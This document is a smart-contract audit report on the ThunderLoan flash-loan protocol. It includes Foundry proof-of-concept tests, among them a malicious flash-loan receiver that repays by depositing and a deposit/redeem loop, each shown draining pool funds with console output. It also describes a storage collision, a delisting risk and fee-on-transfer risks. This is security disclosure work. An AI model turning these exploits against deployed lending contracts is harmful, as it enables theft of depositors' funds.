# ThunderLoan - Audit Report

## Business Idea

The ⚡️ThunderLoan⚡️ protocol is meant to do the following:

1. Give users a way to create flash loans
2. Give liquidity providers a way to earn money off their capital

Liquidity providers can `deposit` assets into `ThunderLoan` and be given `AssetTokens` in return. These `AssetTokens` gain interest over time depending on how often people take out flash loans!

## Expected flow assumptions

- LPs deposits Liquidity
- LPs having assets can redeem their liquidity
- Users can borrow and repay flash loans
- Protocol is upgradable

## PoCs:

### testMuchLessFeeForNonStandardERC20Tokens:

- input: (Paste this test into: `test/ThunderLoanTest.t.sol::ThunderLoanTest`)

```solidity
function testMuchLessFeeForNonStandardERC20Tokens() public setAllowedToken {
    // set usdt as allowed one
    vm.prank(thunderLoan.owner());
    thunderLoan.setAllowedToken(usdtMock, true);

    // Fees charged on standard erc20
    uint256 feeOnStandardERC20 = thunderLoan.getCalculatedFee(tokenA, 1e18);

    // Hypothesis: 1 eth == 5 usdt
    uint256 feeOnNonStandardERC20 = thunderLoan.getCalculatedFee(usdtMock, 5e9);

    console2.log("feeOnStandardERC20   : ", feeOnStandardERC20);
    console2.log("feeOnNonStandardERC20: ", feeOnNonStandardERC20);
}
```

- output

```bash
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/unit/ThunderLoanTest.t.sol:ThunderLoanTest
[PASS] testMuchLessFeeForNonStandardERC20Tokens() (gas: 3828536)
Logs:
  feeOnStandardERC20   :  3000000000000000
  feeOnNonStandardERC20:  15000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.08ms (1.51ms CPU time)

Ran 1 test suite in 65.14ms (8.08ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### testMaliciousUsersTakeOutFlashLoanAndNeverRepay

- input: (Paste this test into: `test/ThunderLoan.t.sol::ThunderLoan`)

```solidity
function testMaliciousUsersTakeOutFlashLoanAndNeverRepay() public setAllowedToken {
    // @TODO: Hack the flash loan....🚀
    vm.startPrank(ALICE);
    tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
    thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
    vm.stopPrank();

    vm.startPrank(BOB);
    tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
    thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
    vm.stopPrank();

    vm.startPrank(CHARLIE);
    tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
    thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
    vm.stopPrank();

    AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);

    uint256 borrowAmount = tokenA.balanceOf(address(assetToken));
    uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, borrowAmount);

    MockFlashLoanReceiverMalicious mockFlashLoanReceiver;

    console2.log(
        "mockFlashLoanReceiver's tokenA balance before Hack    : ", tokenA.balanceOf(address(mockFlashLoanReceiver))
    );
    console2.log("Devil's tokenA balance before Hack                    : ", tokenA.balanceOf(DEVIL));
    console2.log("Asset's tokenA balance before Hack                    : ", tokenA.balanceOf(address(assetToken)));

    vm.startPrank(DEVIL);
    mockFlashLoanReceiver = new MockFlashLoanReceiverMalicious(address(thunderLoan));
    tokenA.mint(address(mockFlashLoanReceiver), calculatedFee + 1e18);
    thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, borrowAmount, "");
    vm.stopPrank();

    console2.log(
        "mockFlashLoanReceiver's tokenA balance after loan     : ", tokenA.balanceOf(address(mockFlashLoanReceiver))
    );
    console2.log("Asset's tokenA balance before Hack                    : ", tokenA.balanceOf(address(assetToken)));

    vm.startPrank(ALICE);
    tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
    thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
    vm.stopPrank();

    vm.startPrank(address(mockFlashLoanReceiver));
    thunderLoan.redeem(tokenA, type(uint256).max);
    vm.stopPrank();

    console2.log(
        "mockFlashLoanReceiver's tokenA balance after Hack     : ", tokenA.balanceOf(address(mockFlashLoanReceiver))
    );

    vm.startPrank(DEVIL);
    mockFlashLoanReceiver.withdrawTokens(tokenA);
    vm.stopPrank();

    console2.log("Devil's tokenA balance after Hack                     : ", tokenA.balanceOf(DEVIL));
    console2.log("Asset's tokenA balance after Hack                     : ", tokenA.balanceOf(address(assetToken)));
}
```

- support:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IFlashLoanReceiver, IThunderLoan } from "../../src/interfaces/IFlashLoanReceiver.sol";

contract MockFlashLoanReceiverMalicious {
    error MockFlashLoanReceiver__onlyOwner();
    error MockFlashLoanReceiver__onlyThunderLoan();

    using SafeERC20 for IERC20;

    address s_owner;
    address s_thunderLoan;

    uint256 s_balanceDuringFlashLoan;
    uint256 s_balanceAfterFlashLoan;

    constructor(address thunderLoan) {
        s_owner = msg.sender;
        s_thunderLoan = thunderLoan;
        s_balanceDuringFlashLoan = 0;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata /*  params */
    )
        external
        returns (bool)
    {
        s_balanceDuringFlashLoan = IERC20(token).balanceOf(address(this));
        if (initiator != s_owner) {
            revert MockFlashLoanReceiver__onlyOwner();
        }
        if (msg.sender != s_thunderLoan) {
            revert MockFlashLoanReceiver__onlyThunderLoan();
        }
        IERC20(token).approve(s_thunderLoan, amount + fee);
        // IThunderLoan(s_thunderLoan).repay(token, amount + fee);
        IThunderLoan(s_thunderLoan).deposit(token, amount + fee);
        s_balanceAfterFlashLoan = IERC20(token).balanceOf(address(this));
        return true;
    }

    function getbalanceDuring() external view returns (uint256) {
        return s_balanceDuringFlashLoan;
    }

    function getBalanceAfter() external view returns (uint256) {
        return s_balanceAfterFlashLoan;
    }

    function withdrawTokens(IERC20 token) public {
        if (msg.sender != s_owner) revert();
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}
```

- output:

```bash
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/unit/ThunderLoanTest.t.sol:ThunderLoanTest
[PASS] testMaliciousUsersTakeOutFlashLoanAndNeverRepay() (gas: 2943837)
Logs:
  mockFlashLoanReceiver's tokenA balance before Hack    :  0
  Devil's tokenA balance before Hack                    :  10000000000000000000000
  Asset's tokenA balance before Hack                    :  3000000000000000000000
  mockFlashLoanReceiver's tokenA balance after loan     :  1000000000000000000
  Asset's tokenA balance before Hack                    :  3009000000000000000000
  mockFlashLoanReceiver's tokenA balance after Hack     :  3015842990302160778596
  Devil's tokenA balance after Hack                     :  13015842990302160778596
  Asset's tokenA balance after Hack                     :  994157009697839221404

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.59ms (2.21ms CPU time)

Ran 1 test suite in 71.95ms (10.59ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### testLPProvidersCanEarnAccrualInterestInstantlyJustAfterDepositAndCanDrainLiquidity

- input: (Paste this test into: `test/ThunderLoan.t.sol::ThunderLoan`)

```solidity
function testLPProvidersCanEarnAccrualInterestInstantlyJustAfterDepositAndCanDrainLiquidity()
    public
    setAllowedToken
{
    // 10000_000_000_000_000_000_000
    console2.log("Alice's tokenA balance before Deposit  : ", tokenA.balanceOf(ALICE));
    console2.log("Bob's tokenA balance before Deposit    : ", tokenA.balanceOf(BOB));
    console2.log("Charlie's tokenA balance before Deposit: ", tokenA.balanceOf(CHARLIE));
    console2.log("Devil's tokenA balance before Deposit  : ", tokenA.balanceOf(DEVIL));

    vm.startPrank(ALICE);
    tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
    thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
    vm.stopPrank();

    vm.startPrank(BOB);
    tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
    thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
    vm.stopPrank();

    vm.startPrank(CHARLIE);
    tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
    thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
    vm.stopPrank();

    console2.log("-------------------------");

    // 9000_000_000_000_000_000_000
    console2.log("Alice's tokenA balance after Deposit   : ", tokenA.balanceOf(ALICE));
    console2.log("Bob's tokenA balance after  Deposit    : ", tokenA.balanceOf(BOB));
    console2.log("Charlie's tokenA balance after  Deposit: ", tokenA.balanceOf(CHARLIE));
    console2.log("Devil's tokenA balance after  Deposit  : ", tokenA.balanceOf(DEVIL));

    console2.log("-------------------------");

    AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);

    console2.log("AssetToken tokenA balance              : ", tokenA.balanceOf(address(assetToken)));

    uint256 exchangeRate = assetToken.getExchangeRate();
    console2.log("exchange rate                          : ", exchangeRate);

    while (true) {
        exchangeRate = assetToken.getExchangeRate();
        uint256 expectedBalanceAfterDeposit = DEPOSIT_AMOUNT + tokenA.balanceOf(address(assetToken));
        uint256 mintAmount = (DEPOSIT_AMOUNT * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        uint256 newAssetTokenTotalSupply = assetToken.totalSupply() + mintAmount;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, DEPOSIT_AMOUNT);
        uint256 newExchangeRate =
            exchangeRate * (newAssetTokenTotalSupply + calculatedFee) / newAssetTokenTotalSupply;

        uint256 devilAssetTokenBalance = assetToken.balanceOf(DEVIL) + mintAmount;
        uint256 expectedRedeemableAmount =
            (devilAssetTokenBalance * newExchangeRate) / assetToken.EXCHANGE_RATE_PRECISION();

        if (expectedRedeemableAmount != 0 && expectedRedeemableAmount <= expectedBalanceAfterDeposit) {
            vm.startPrank(DEVIL);
            tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
            thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);

            thunderLoan.redeem(tokenA, type(uint256).max);
            vm.stopPrank();
        } else {
            break;
        }
    }

    console2.log("-------------------------");

    console2.log("Devil's tokenA balance after  Hack     : ", tokenA.balanceOf(DEVIL));
    console2.log("Devil's asset  balance after  Hack     : ", assetToken.balanceOf(DEVIL));
    exchangeRate = assetToken.getExchangeRate();
    console2.log("exchange rate                          : ", exchangeRate);
    console2.log("AssetToken tokenA balance              : ", tokenA.balanceOf(address(assetToken)));

    // 3000_000_000_000_000_000_000 <- underlying balance after hack
    // 760_460_381_332_020_568 <- underlying balance after hack

    // @current issue(s): Funds drain, first and last LPs face DoS, Race conditions among LPs due to DoS threat
    // @Recommendation: exchange rate must only be updated on if a flash loan occurred and been succeeded
}
```

- output:

```bash
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/unit/ThunderLoanTest.t.sol:ThunderLoanTest
[PASS] testLPProvidersCanEarnAccrualInterestInstantlyJustAfterDepositAndCanDrainLiquidity() (gas: 295202361)
Logs:
  Alice's tokenA balance before Deposit  :  10000000000000000000000
  Bob's tokenA balance before Deposit    :  10000000000000000000000
  Charlie's tokenA balance before Deposit:  10000000000000000000000
  Devil's tokenA balance before Deposit  :  10000000000000000000000
  -------------------------
  Alice's tokenA balance after Deposit   :  9000000000000000000000
  Bob's tokenA balance after  Deposit    :  9000000000000000000000
  Charlie's tokenA balance after  Deposit:  9000000000000000000000
  Devil's tokenA balance after  Deposit  :  10000000000000000000000
  -------------------------
  AssetToken tokenA balance              :  3000000000000000000000
  exchange rate                          :  1005513770132934641
  -------------------------
  Devil's tokenA balance after  Hack     :  12999239539618667979432
  Devil's asset  balance after  Hack     :  0
  exchange rate                          :  20153366043236062570
  AssetToken tokenA balance              :  760460381332020568

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 373.12ms (372.14ms CPU time)

Ran 1 test suite in 374.20ms (373.12ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### DoS on redeeming underlying for first and last LPs due to the update exchange rate in deposit function, a race condition among arises among LPs.

- Refer `testLPProvidersCanEarnAccrualInterestInstantlyJustAfterDepositAndCanDrainLiquidity` PoC for better understanding

### Missing event emission on flash loan fee update

```solidity
function updateFlashLoanFee(uint256 newFee) external onlyOwner {
    if (newFee > s_feePrecision) {
        revert ThunderLoan__BadNewFee();
    }
    s_flashLoanFee = newFee;
    // @info: missing event emission for fee update
}
```

### Storage Collision between ThunderLoan and ThunderLoanUpgradable

- ThunderLoan:

```solidity
mapping(IERC20 => AssetToken) public s_tokenToAssetToken;

// The fee in WEI, it should have 18 decimals. Each flash loan takes a flat fee of the token price.
uint256 private s_feePrecision;
uint256 private s_flashLoanFee; // 0.3% ETH fee

mapping(IERC20 token => bool currentlyFlashLoaning) private s_currentlyFlashLoaning;
```

- ThunderLoanUpgradable:

```solidity
mapping(IERC20 => AssetToken) public s_tokenToAssetToken;

// The fee in WEI, it should have 18 decimals. Each flash loan takes a flat fee of the token price.
// @info: storage collision in upgrading implementation
uint256 private s_flashLoanFee; // 0.3% ETH fee
uint256 public constant FEE_PRECISION = 1e18;

mapping(IERC20 token => bool currentlyFlashLoaning) private s_currentlyFlashLoaning;
```

- ThunderLoan Storage layout:

```bash
╭-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------╮
| Name                    | Type                                            | Slot | Offset | Bytes | Contract                                 |
+==============================================================================================================================================+
| _initialized            | uint8                                           | 0    | 0      | 1     | src/protocol/ThunderLoan.sol:ThunderLoan |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------|
| _initializing           | bool                                            | 0    | 1      | 1     | src/protocol/ThunderLoan.sol:ThunderLoan |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------|
| __gap                   | uint256[50]                                     | 1    | 0      | 1600  | src/protocol/ThunderLoan.sol:ThunderLoan |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------|
| _owner                  | address                                         | 51   | 0      | 20    | src/protocol/ThunderLoan.sol:ThunderLoan |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------|
| __gap                   | uint256[49]                                     | 52   | 0      | 1568  | src/protocol/ThunderLoan.sol:ThunderLoan |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------|
| __gap                   | uint256[50]                                     | 101  | 0      | 1600  | src/protocol/ThunderLoan.sol:ThunderLoan |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------|
| __gap                   | uint256[50]                                     | 151  | 0      | 1600  | src/protocol/ThunderLoan.sol:ThunderLoan |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------|
| s_poolFactory           | address                                         | 201  | 0      | 20    | src/protocol/ThunderLoan.sol:ThunderLoan |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------|
| s_tokenToAssetToken     | mapping(contract IERC20 => contract AssetToken) | 202  | 0      | 32    | src/protocol/ThunderLoan.sol:ThunderLoan |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------|
| s_feePrecision          | uint256                                         | 203  | 0      | 32    | src/protocol/ThunderLoan.sol:ThunderLoan |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------|
| s_flashLoanFee          | uint256                                         | 204  | 0      | 32    | src/protocol/ThunderLoan.sol:ThunderLoan |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------|
| s_currentlyFlashLoaning | mapping(contract IERC20 => bool)                | 205  | 0      | 32    | src/protocol/ThunderLoan.sol:ThunderLoan |
╰-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------╯
```

- ThunderLoanUpgradable Storage layout:

```bash
╭-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------------------------------╮
| Name                    | Type                                            | Slot | Offset | Bytes | Contract                                                         |
+======================================================================================================================================================================+
| _initialized            | uint8                                           | 0    | 0      | 1     | src/upgradedProtocol/ThunderLoanUpgraded.sol:ThunderLoanUpgraded |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------------------------------|
| _initializing           | bool                                            | 0    | 1      | 1     | src/upgradedProtocol/ThunderLoanUpgraded.sol:ThunderLoanUpgraded |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------------------------------|
| __gap                   | uint256[50]                                     | 1    | 0      | 1600  | src/upgradedProtocol/ThunderLoanUpgraded.sol:ThunderLoanUpgraded |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------------------------------|
| _owner                  | address                                         | 51   | 0      | 20    | src/upgradedProtocol/ThunderLoanUpgraded.sol:ThunderLoanUpgraded |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------------------------------|
| __gap                   | uint256[49]                                     | 52   | 0      | 1568  | src/upgradedProtocol/ThunderLoanUpgraded.sol:ThunderLoanUpgraded |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------------------------------|
| __gap                   | uint256[50]                                     | 101  | 0      | 1600  | src/upgradedProtocol/ThunderLoanUpgraded.sol:ThunderLoanUpgraded |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------------------------------|
| __gap                   | uint256[50]                                     | 151  | 0      | 1600  | src/upgradedProtocol/ThunderLoanUpgraded.sol:ThunderLoanUpgraded |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------------------------------|
| s_poolFactory           | address                                         | 201  | 0      | 20    | src/upgradedProtocol/ThunderLoanUpgraded.sol:ThunderLoanUpgraded |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------------------------------|
| s_tokenToAssetToken     | mapping(contract IERC20 => contract AssetToken) | 202  | 0      | 32    | src/upgradedProtocol/ThunderLoanUpgraded.sol:ThunderLoanUpgraded |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------------------------------|
| s_flashLoanFee          | uint256                                         | 203  | 0      | 32    | src/upgradedProtocol/ThunderLoanUpgraded.sol:ThunderLoanUpgraded |
|-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------------------------------|
| s_currentlyFlashLoaning | mapping(contract IERC20 => bool)                | 204  | 0      | 32    | src/upgradedProtocol/ThunderLoanUpgraded.sol:ThunderLoanUpgraded |
╰-------------------------+-------------------------------------------------+------+--------+-------+------------------------------------------------------------------╯
```

- As we can see:
    - slot 203 is holds `s_flashLoanFee` for upgraded one and `s_feePrecision` for base implementation


### User may lost their Deposited underlyings if owner removes token from allowed list...

```solidity
function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
    if (allowed) {
        if (address(s_tokenToAssetToken[token]) != address(0)) {
            revert ThunderLoan__AlreadyAllowed();
        }
        string memory name = string.concat("ThunderLoan ", IERC20Metadata(address(token)).name());
        string memory symbol = string.concat("tl", IERC20Metadata(address(token)).symbol());
        AssetToken assetToken = new AssetToken(address(this), token, name, symbol);
        s_tokenToAssetToken[token] = assetToken;
        emit AllowedTokenSet(token, assetToken, allowed);
        return assetToken;
    } else {
        AssetToken assetToken = s_tokenToAssetToken[token];
        delete s_tokenToAssetToken[token];
        emit AllowedTokenSet(token, assetToken, allowed);
        return assetToken;
    }
}
```

- Let's say, Alice, Bob, and Charlie have deposited 100 tokenA into thunderLoan
- Owner comes and sets `tokenA` to false
- Users try to redeem their tokens
- However redeem function gets zero address as asset token for their underlying ones
- Effectively, redeem get zero values for all queries to assetToken
- Guess what? 0 tokens to redeem

### Oracle Price Manipulation is Possible due to flash loan built in advantage

### Fee on transfer tokens allows LPs to deposit less and redeem more

```solidity
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
    AssetToken assetToken = s_tokenToAssetToken[token];
    uint256 exchangeRate = assetToken.getExchangeRate();
    uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
    emit Deposit(msg.sender, token, amount);
    assetToken.mint(msg.sender, mintAmount);
    uint256 calculatedFee = getCalculatedFee(token, amount);
    assetToken.updateExchangeRate(calculatedFee);
    // @info: transferring token in the end
    // @issue: there could have a reentrancy, fee on transfers, rebasing, weird non-standard tokens, etc.
    // @danger: reentrancy: infinite mint, fee-on-transfer: deposit less redeem more, etc
    token.safeTransferFrom(msg.sender, address(assetToken), amount);
}
```

### Zero fee charge on weird erc20 tokens

- Tokens having less precision i.e., _000, are able to pay 0 fee on flash loan. It's like paying zero fee on taking out loan of a disguised ETH e.g: a token with precision: 1_000 == 1 token, and 1000 tokens == 1 ETH, users take out flash loan of 1000 tokens or 1 disguised ETH and paid nothing as fee.





<br/>
<br/>
<br/>
<br/>
<br/>

##### Auditor|Sec-Res|White-Hat: *theirrationalone*